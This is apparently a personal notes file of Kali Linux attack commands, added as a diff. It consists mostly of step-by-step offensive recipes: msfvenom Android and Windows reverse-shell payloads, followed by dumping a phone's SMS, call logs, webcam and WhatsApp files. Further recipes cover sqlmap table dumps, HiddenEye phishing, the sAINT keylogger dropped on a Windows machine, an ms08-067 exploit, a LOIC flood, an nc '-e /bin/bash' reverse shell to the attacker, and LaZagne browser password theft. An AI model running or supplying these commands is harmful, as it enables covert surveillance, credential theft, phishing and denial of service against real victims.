@@ -1,0 +1,553 @@
+wlan0 issue
+............
+https://drive.google.com/file/d/1g1JVZ42FIzMCJTKOV6pxvN9Pa6i7soWp/view?usp=sharing
+
+tar -xjvf compact-wireless-2010–06–26-p.tar.bz2
+
+cd compat-wireless-2010–06–26-p
+make load
+##################################################
+SetUp Wifi 
+..........
+
+sudo apt-get install kali-linux-wireless
+iwconfig
+ifconfig wlan0 up
+ifconfig
+
+##################################################
+msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.105 lport=1234 > shell.apk
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.0.105
+set lport 1234
+exploit
+
+ls -l
+cd sdcard
+ls -l
+
+cd WhatsApp/Media
+download <name of file>
+
+sysinfo
+wlan_geolocate
+check_root
+dump_calllog
+dump_sms
+webcam_snap
+
+send_sms -d 9869089191 -t hacked
+
+help
+
+##################################################
+
+Scan Connected Devices On Router
+
+nmap -sP 192.168.0.0/24
+
+##################################################
+
+Whats APP
+.........
+
+
+#################################################
+MySQL Hacking
+
+Google this String "http //test.vulnweb.com/ php id=1"
+
+copy http://testphp.vulnweb.com/artists.php?artist=1
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+
+Y
+n
+
+N
+
+you will see name of dbs
+
+information_schema 
+acuart
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --dump
+
+##################################################
+
+Beef Broser Exploit
+
+apt install beef-xss
+
+
+> beef-xss
+> cd /var/www/html
+open index.html
+#######################################################################################
+
+Phishing Attacks
+
+hidden eye script from github
+pip3 install requests
+
+git clone https://github.com/DarkSecDevelopers/HiddenEye.git
+
+cd HiddenEye
+
+python3 HiddenEye.py
+
+########################################################
+KeyLogger
+
+
+apt install maven default-jdk default-jre openjdk-8-jdk openjdk-8-jre -y
+apt install zlib1g-dev libncurses5-dev lib32z1 lib32ncurses6 -y
+git clone https://github.com/tiagorlampert/sAINT.git
+cd sAINT
+
+chmod +x configure.sh
+
+./configure.sh
+
+java -jar sAINT.jar
+
+fill the information 
+and in sAINT/target you will get 
+
+saint-1.0-jar-with-dependancies.jar
+
+copy this payload to windows machine and click it
+
+verify appdata
+cd local 
+
+################################################
+
+shodan.io
+
+sudo apt install android-tools-adb android-tools-fastboot
+
+adb version
+
+connect your phone with Devloper Options Enabled and Usb Debugging On.
+
+adb devices
+
+################################################
+for xp targets
+exploit/windows/smb/ms08_067_netapi
+
+show targets
+
+netdiscover
+use 
+set payload windows/meterpreter/reverse_tcp
+
+set lhost 192.168.0.105 <kali ip>
+set rhost 192.168.0.102 <victim ip>
+
+################################################	1`		
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=1234 -f exe -o /root/Desktop/fun.exe
+
+
+search vlc
+use 3
+
+set lhost 192.168.0.105
+exploit 
+
+open another terminal 
+cd /root/.msf4
+
+ls
+
+cd * ../../Desktop/
+use exploit/multi/handler
+set payload windows/x64/shell/reverse_tcp
+set LHOST 192.168.0.102
+
+
+########################################################################
+Pen Testing
+##########################################################################
+apt-get install preload bleachbit bum apt-file scrub figlet tor recon-ng
+leafpad /root/.bashrc
+
+go to end 
+figlet SSS
+
+***************************************************************************
+Setup SSH
+
+cd /etc/ssh
+mkdir backup_ssh_keys
+mv ssh_host_* backup_ssh_keys
+dpkg-reconfigure openssh-server
+service ssh start
+
+netstat -antp
+
+leafpad /etc/proxychain.conf
+
+# strict_chain 
+and
+dynamic_chain
+
+and in the last add
+
+sock5 127.0.0.1 9050
+
+service tor start
+
+service tor status
+
+iceweasel www.whatismyip.com
+
+proxychains iceweasel www.whatismyip.com
+.........................................
+
+chkrootkit
+
+KeepNote >> For Notepad
+
+Create a new project
+
+www.myproject.com
+Informaion gathering
+	fooprinting 
+Exernal Test
+	website
+	Network
+Internal Test
+	Social Eng
+	wifi
+	sniffing
+	brute-force
+	exploitation
+	value scan 
+	port scan 
+
+Google Dork
+	site: pastebin.com www.goodhacking.org
+
+www.exploit-db.com
+
+www.dnsstuff.com
+.................................................................
+
+metagoofil
+
+metagoofil -d goodhacking.org -t doc -o temp -f goodhacking.html 
+.................................................................
+
+theharvester -d microsoft.com -l 500 -b google
+..............................................
+
+whois ehicalhackingblog.com
+
+fierce -dns ethicalhackingblog.com
+....................................................................
+
+Information Gathering (Deepmagic innformaion gahering Tool (Dmitry))
+
+dmitry -winsepfbo ethicalhackingblog.com
+....................................................................
+One Of The Best Tool 
+git clone https://github.com/leebaird/discover.git
+cd discover
+./discover.sh
+
+
+***************************************************************************
+
+recon-ng
+>> load infodb
+>> back
+[default] >> workspaces add mysite
+[mysite]  >> add domains ethicalhackingblog.com
+[mysite]  >> load bing_domain_web 
+	  >> run
+
+	  >> load brute_hosts 
+	  >> run 
+
+	  >> show hosts
+	  >> load hosts-hosts/resolve
+	  >> run
+
+	  >> load hosts-hosts/reverse-resolve
+	  >> load ipinfodb
+	  >> run
+
+	  >> keys add ipinfodb kahsdkjashdkajshkasjdhkasjdhkasjhda
+	
+to get the key create the accoun on ipinfodb.com 
+	  >> load hml 
+	  >> show options
+
+	  >> set creator GauravTalele
+	  >> set customer mywebsite
+	  >> run
+
+ traceroute www.google.com >> gives hops to reach the server
+
+nmap -v --traceroute <ip>
+
+.............................................
+
+Live Hos Discovery 
+nmap 
+hping3
+
+
+ping pluralsight.com -c 3 # send 3 packets -t unlimited
+
+hping3 -S www.pluralsight.com -p 80 -c 3
+
+nmap -T4 -sn www.pluralsight.com -v
+................................................
+
+Port Scanning 
+.............
+-sA
+
+nmap -T4 -v -PN -n -sS --top-ports 100 --max-parallelism 10 -oA nmapSYN <ip>
+
+Aggresive Scan 
+nmap -5 -PN -v -A -oA nmapComplete <ip>
+
+WAF (Web Application Firewall)
+
+wafw00f https://www.ethicalhackingblog.com
+
+Load Balancing check
+....................
+lbd www.ethicalhackingblog.com
+
+.....................................
+
+Web Crawling 
+
+Burp Suit
+dirbuster
+OWASP-ZAP
+vega
+webscarab
+webslayer
+
+
+windows key >> kali linux >> op 10 tool >> Burp Suit
+
+Proxy >> Options >> see the proxy 
+firefox >> foxyproxy >> circle icon on bar >> 
+
+manual proxy config >>
+127.0.0.1 8080
+
+Genral >> BurpProxy
+
+Save 
+
+apt-get install httrack 
+
+httrack "https://www.w3schools.com" -O "/tmp/htrack" -v
+
+
+SSL Scaninh
+sslscan www.ehicalhackingblog.com
+
+CMS Scan 
+www.turnkeylinux.org
+search wordpress
+
+wpscan -u 192.168.0.108 --enumerate vp
+wpscan -u 192.168.0.108 --enumerate u
+
+wpscan -u 192.168.0.108 --wordlist /usr/share/wordlists/rockyoy.txt --username admin
+
+.................................
+
+weevely
+
+file browsing 
+file transfer
+auditing
+compromising SQL Servers
+reverse TCP Shells 
+command execution
+
+>> weevely generate hacker 
+
+dvwa login in web browser
+
+DOS
+Low Orbit Ion Cannon 
+Flood with packaes
+
+apt-get install mono-gmcs -y
+apt-get install mono-mcs -y
+apt-get install monodevelop -y
+apt-get install -y liblog4net-cli-dev
+
+download 
+https://github.com/NewEraCracker/LOIC.git
+
+cd src
+mdtool build
+chmod +x LOIC.exe
+./LOIC.exe
+
+................................
+msfconsole
+workspace -a PluralSightLab
+workspace PluralSightLab
+workspace
+
+search ircd
+
+copy the name
+info <name>
+
+use <name>
+
+RHOST ==>> Target Machine
+LHOST ==>> Listening Machine (ipconfig ka ip)
+
+show payload
+
+set PAYLOAD cmd/unix/reverse
+
+set LHOST <my IP>
+
+exploit
+................................
+POST Exploiation
+
+ctrl + z
+
+> sessions
+
+>> use post/linux/gather/hashdump
+>> show options
+
+set SESSION 1
+
+exploit
+
+............................
+
+
+use post/linux/gather/checkvm
+show options
+set SESSION 1
+
+exploit
+.............................
+use post/linux/gather/enum_configs
+
+set SESSION 1
+
+exploit
+...........................
+
+use post/linux/gather/enum_network
+
+set SESSION 1
+
+exploit
+
+................................
+use post/linux/gather/enum_protections
+
+set SESSION 1
+
+exploit
+................................
+use post/linux/gather/enum_system
+
+set SESSION 1
+
+exploit
+................................
+
+use post/linux/gather/enum_users_history
+
+set SESSION 1
+
+exploit
+................................
+
+new erminal >> nc -lvp 4444
+
+.................................
+msf >> nc -vn <atacker ip> 4444 -e /bin/bash
+
+...............................
+above comands bypass the firewall 
+..........................................
+
+
+
+
+
+Meterpreter
+Payload Types 
+	singles 
+	stagers
+	stages
+
+in memory no disk write
+powerfull payload
+
+.............................
+XP Attack 
+nmap -sV <ip> # list servises
+445/TCP microsoft-ds (printer shaing service) 
+
+msfconsole
+search ms08-067
+
+use <name>
+set RHOST <VICTIM IP>
+show payload
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST <my ip>
+exploit
+meterpreter> help
+
+************
+run winenum
+
+shell 
+
+..................................
+apt-get install armitage -y
+> armitage
+
+db error 
+> msfdb init
+> /etc/init.d/postresql start 
+..................................
+
+https://github.com/AlessandroZ/LaZagne
+
+pip install -r requirements.txt
+
+cd Windows
+python laZagne.py browsers
+
+Remember that while runninng this command your chome browser should be closed
+..............................................................................
+
+
+
